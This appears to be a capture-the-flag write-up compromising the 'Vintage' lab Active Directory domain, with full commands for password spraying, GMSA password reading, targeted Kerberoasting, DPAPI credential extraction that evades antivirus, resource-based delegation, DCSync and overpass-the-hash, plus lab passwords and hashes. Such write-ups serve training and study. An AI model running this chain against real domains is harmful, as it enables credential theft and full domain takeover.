+++
date = '2026-07-27T13:14:24+02:00'
draft = false
title = 'Vintage Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`31/07/2026`**

![Vintage.png](/images/imgs_vintage/Vintage.png)

---
# Introduction

**_Vintage_** is a **Hard-level Active Directory** environment designed as an **assumed breach** scenario that heavily focuses on **Kerberos-only authentication**, complex permission chains, and manual credential extraction.

Starting with a provided set of low-privileged credentials, the exploitation path begins by bypassing traditional **NTLM authentication** to enumerate the domain via **Kerberos**. By chaining a default password misconfiguration on a **PRE-WINDOWS 2000 COMPATIBLE** machine account, I managed to read a **GMSA password**. This access allowed me to manipulate group memberships, re-enable a disabled service account, and perform **Targeted Kerberoasting** to gain initial user access.
Lateral movement involves a manual **DPAPI** blob extraction to **bypass antivirus** restrictions and recover **stored credentials**. Finally, the Privilege Escalation relies on abusing the **AllowedToAct** attribute to dump domain hashes via a **DCSync attack** and impersonate a delegated **administrator**, ultimately compromising the entire Active Directory domain.

---
# Techniques Used

- **Kerberos-Only Authentication & Password Spraying**

- **GMSA Password Extraction**

- **Targeted Kerberoasting**

- **Pass-the-Hash**

- **Manual DPAPI Credential Extraction**

- **Resource-Based Constrained Delegation Attack**

- **DCSync Attack**

- **Overpass-the-Hash**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- vintage -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49683/tcp open  unknown
54758/tcp open  unknown
54776/tcp open  unknown
```

Targeted script and version detection scan:

```bash
nmap -sC -sV vintage -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-25 15:14:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-25T15:14:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

I added **`vintage.htb`** and **`dc01.vintage.htb`** to my **`/etc/hosts`** file.

## Active Directory Enumeration

Since this machine simulates an **assumed breach** scenario, I started my enumeration using the provided initial credentials: **P.Rosa:Rosaisbest123**.

I initially tried to enumerate **SMB** shares and users using **NetExec**, but the commands kept failing:

```bash
nxc smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' --shares

nxc smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' --users
```

![smbfail.png](/images/imgs_vintage/smbfail.png)

The output continuously returned **`STATUS NOT SUPPORTED`**. Even when attempting **WinRM** and passing the **`-k`** flag for **Kerberos authentication**, I was met with errors.

Falling back to the **IP address** and using **`--rid-brute`**, I was finally able to dump a valid list of users:

```bash
nxc smb 10.129.231.205 -u P.Rosa -p Rosaisbest123 --rid-brute -k
```

![ridbrute.png](/images/imgs_vintage/ridbrute.png)

**Valid Users Dumped**:

```text
Administrator
Guest
krbtgt
DC01$
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

I then attempted a **password spray** across all users:

```bash
nxc smb 10.129.231.205 -u users.txt -p Rosaisbest123 --continue-on-success -k
```

![ntlmdisable.png](/images/imgs_vintage/ntlmdisable.png)

This returned a very important detail: every user threw the same **`KDC_ERR_PREAUTH_FAILED`** error.
This confirmed my suspicion: **NTLM authentication** was disabled on the domain. In this environment, it was mandatory to authenticate exclusively through **Kerberos**. This perfectly explained all the initial errors I encountered.

---
# Initial Access | GMSA & Targeted Kerberoasting

To get a clearer picture of the domain, I collected data with **BloodHound**:

```bash
bloodhound-python -u P.Rosa -p Rosaisbest123 -ns 10.129.231.205 -d vintage.htb -c all --zip
```

![harvest.png](/images/imgs_vintage/harvest.png)

Reviewing the data, two users stood out: **`C.Neri`** and **`L.Bianchi`**. They were part of the **`ServiceManagers`** group, which held **`GenericAll`** privileges over three service accounts.

![hound1.png](/images/imgs_vintage/hound1.png)

My initial thought was to compromise the **`svc_sql`** user and dump a ticket, but finding a path to that user proved incredibly difficult.

After running multiple custom cypher queries with no luck, I shifted my focus to **Machine Accounts**: **`FS01$`** and **`gMSA01$`**.
I discovered that **`FS01.VINTAGE.HTB`** was a member of both **`Domain Computers`** and **`PRE-WINDOWS 2000 COMPATIBLE ACCESS`**.

![hound2.png](/images/imgs_vintage/hound2.png)

**Note**: _Upon researching the **PRE-WINDOWS 2000 COMPATIBLE ACCESS** group, I learned that accounts in this group are often set up with a default password that matches their account name._

![validate.png](/images/imgs_vintage/validate.png)

Now, **`FS01$`** is a member of the **`Domain Computers`** group, it had **`ReadGMSAPassword`** over the **`GMSA01$`** account.

![hound3.png](/images/imgs_vintage/hound3.png)

Furthermore, **`GMSA01$`** had **`AddSelf`** and **`GenericWrite`** over the **`ServiceManagers`** group.

![hound4.jpeg](/images/imgs_vintage/hound4.jpeg)

The attack path was finally clear.

I dumped the **GMSA hash**:

```bash
nxc ldap 10.129.231.205 -u 'fs01$' -p 'fs01' -k --gmsa
```

![gmsa.png](/images/imgs_vintage/gmsa.png)

and used **bloodyAD** to add **`gmsa01$`** to the **`ServiceManagers`** group:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'gmsa01$' -p 'e082d85e0e0e5c2132e116c852cd1159' -f rc4 -k add groupMember ServiceManagers 'gmsa01$'
```

![gmsaadd.png](/images/imgs_vintage/gmsaadd.png)

Next, I requested a **TGT** for **`gmsa01$`** and attempted a **Targeted Kerberoast**:

```bash
getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :e082d85e0e0e5c2132e116c852cd1159

python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

![gmsaticket.png](/images/imgs_vintage/gmsaticket.png)

Here, I noticed something strange: I received the **TGS** for **`svc_ldap`** and **`svc_ark`**, but not for **`svc_sql`**.
Re-checking **BloodHound**, I found the reason: **`svc_sql`** had the flag **`ENABLED: FALSE`**. The account was disabled.

I removed the **`ACCOUNTDISABLE`** flag:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'gmsa01$' -p 'e082d85e0e0e5c2132e116c852cd1159' -f rc4 -k remove uac svc_sql -f ACCOUNTDISABLE
```

![enablesql.png](/images/imgs_vintage/enablesql.png)

re-ran the **Kerberoast**, and finally captured the **TGS** for **`svc_sql`**.

```
python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

![tgs.png](/images/imgs_vintage/tgs.png)

I saved the ticket and cracked it using **John the Ripper**:

```bash
john svc_sql --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![john](/images/imgs_vintage/john.png)

As I usually do when uncovering a new password in an AD environment, I launched a **password spray**:

```bash
nxc smb 10.129.231.205 -u users.txt -p 'Zer0the0ne' --continue-on-success -k
```

![spray.png](/images/imgs_vintage/spray.png)

This successfully landed a hit on the user **`C.Neri`**. 

According to **BloodHound**, **`C.Neri`** was a member of the **Remote Management Group**. However, standard WinRM access failed.

![noaccess.png](/images/imgs_vintage/noaccess.png)

I had to remember the golden rule of this domain: **Kerberos Only**.

I automatically generated a local **`krb5.conf`** file:

```bash
nxc smb dc01.vintage.htb --generate-krb5-file vintage.krb5
```

![krb5config.png](/images/imgs_vintage/krb5config.png)

I requested a **TGT** for **`C.Neri`**, and used **Evil-WinRM** with the **Kerberos** cache to gain a shell:

```bash
sudo cp vintage.krb5 /etc/krb5.conf
getTGT.py 'vintage.htb/c.neri' -dc-ip 10.129.47.169
export KRB5CCNAME=c.neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

![userf.png](/images/imgs_vintage/userf.png)

I successfully retrieved the user flag from **`C:\Users\C.Neri\Desktop\user.txt`**.

---
# Lateral Movement | Manual DPAPI Decryption

In my personal methodology, whenever I gain access to a **Windows** machine, one of the very first enumeration steps I take is checking for **Stored Credentials** or **Vaults**.

```powershell
cmdkey /list
```

![creds0.png](/images/imgs_vintage/creds0.png)

If **cmdkey** doesn't work I proceed manually:

```
cd appdata\roaming\microsoft\credentials
gci -force
```

![creds1.png](/images/imgs_vintage/creds1.png)

I found a stored credential file named **`C4BB96844A5C9DD45D5B6A9859252BA6`**. 

I tried multiple times to download it to my **Kali** machine using standard **WinRM** download command, but I kept encountering errors.

I attempted to use **`Invoke-WCMDump.ps1`** to crack it from the inside, but the script was instantly flagged and blocked by the **AV**.

![av.png](/images/imgs_vintage/av.png)

At this point, I decided to proceed with an advanced manual technique that I learned from **IppSec**: extracting the raw bytes as a Base64 string directly from the command line, bypassing the need to drop files on disk or trigger the **AV** during a download.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

![creds2.png](/images/imgs_vintage/creds2.png)

I extracted the **master keys** from the **`protect`** directory.

**Note**: _Navigating to the directory, I found two different files. Since I wasn't entirely sure which one was the correct **master key** for this specific credential blob (as **DPAPI** can utilize different keys, such as **User/Machine** or **domain backup keys**), I decided to extract both of them and let **pypykatz** handle the correct decryption mapping offline._

```powershell
cd ../protect
cd S-1-5-21-4024337825-2033394866-2055507597-1115
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
```

![creds3.png](/images/imgs_vintage/creds3.png)

![creds4.png](/images/imgs_vintage/creds4.png)

Back on my attacker machine I decoded the strings:

```bash
cat blob.654 | base64 -d > blob
cat key1.b64 | base64 -d > key1
cat key2.b64 | base64 -d > key2
```

![creds5.png](/images/imgs_vintage/creds5.png)

And used **pypykatz** to decrypt the **master keys** using the user's password, ultimately unlocking the credential blob:

```bash
pypykatz prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
pypykatz dpapi masterkey key1 pkf -o mkf1
pypykatz dpapi masterkey key2 pkf -o mkf2
pypykatz dpapi credential mkf2 blob
```

![creds6.png](/images/imgs_vintage/creds6.png)

---
# Privilege Escalation | AllowedToAct to Root

With the credentials for **`c.neri_adm`**, I checked **BloodHound** once more to map out their exact permissions.

![kttk.png](/images/imgs_vintage/kttk.png)

I discovered the **key to the kingdom**: 
- **`c.neri_adm`** is a member of the **`DelegatedAdmins`** group, which holds the **`AllowedToAct`** privilege over the **Domain Controller**.

This meant the group could configure **Resource-Based Constrained Delegation** (**RBCD**) and effectively impersonate any user on the **DC**.

I added the compromised machine account (**`fs01$`**) to the **`DelegatedAdmins`** group and requested a **Service Ticket** impersonating the **Domain Controller** itself. Using this ticket, I performed a **DCSync attack** via **`secretsdump.py`** to pull the domain hashes directly from the **NTDS**:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember DelegatedAdmins 'fs01$'
```

![delegated.png](/images/imgs_vintage/delegated.png)

```bash
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.47.169 'vintage.htb/fs01$:fs01'
```

![st.png](/images/imgs_vintage/st.png)

```bash
KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb
```

![secrets.png](/images/imgs_vintage/secrets.png)

Since the **Administrator** account did not have remote access enabled, I performed an **Overpass-the-Hash attack**. I utilized the hash for **`l.bianchi_adm`** to grab a **TGT** and opened an **Evil-WinRM** session:

```bash
getTGT.py -hashes :ec<REDACTED>19 vintage.htb/l.bianchi_adm@vintage.htb
```

![bianchi.png](/images/imgs_vintage/bianchi.png)

```bash
KRB5CCNAME='l.bianchi_adm@vintage.htb.ccache' evil-winrm -i dc01.vintage.htb -r vintage.htb
```

![rootf.png](/images/imgs_vintage/rootf.png)

I successfully connected as a **Domain Admin** and retrieved the **root flag** located in **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Final Thoughts

**_Vintage_** is an absolute masterclass in modern Active Directory exploitation and a perfect representation of a realistic assumed breach scenario. 

To be fair, while this is by far the hardest box I have ever pwned, the exploitation path itself doesn't involve extremely complicated attacks. The true difficulty lies in the enumeration phase—finding the right path and figuring out how to navigate the domain with NTLM authentication completely disabled. It forces you out of the standard AD playbook and demands a solid understanding of how **Kerberos** operates under the hood.

Without a doubt, the most beautiful part of the machine was the lateral movement phase. Being forced to abandon automated tools and manually extract the **DPAPI blob** and **master keys** from the command line to **bypass the Antivirus** felt incredibly rewarding and authentic to a true **Red Team** engagement. 

**Sources**:

- **PRE-WINDOWS 2000 COMPATIBLE ACCESS | https://redheadsec.tech/compatibility-to-compromise/#:~:text=TLDR%3A%20Pre%2Dcreated%20Computer%20accounts%20have%20random%20passwords,back%20to%20this%20same%20default%20password%20format.**

- **Targeted Kerberoasting | https://github.com/ShutdownRepo/targetedKerberoast**

- **Invoke-WCMDump.ps1 | https://github.com/peewpw/Invoke-WCMDump**

- **Windows DPAPI Manual Extraction | https://ippsec.rocks/?#**

- **DCSync Attack | https://www.youtube.com/watch?v=qEEB1SjPPQ8**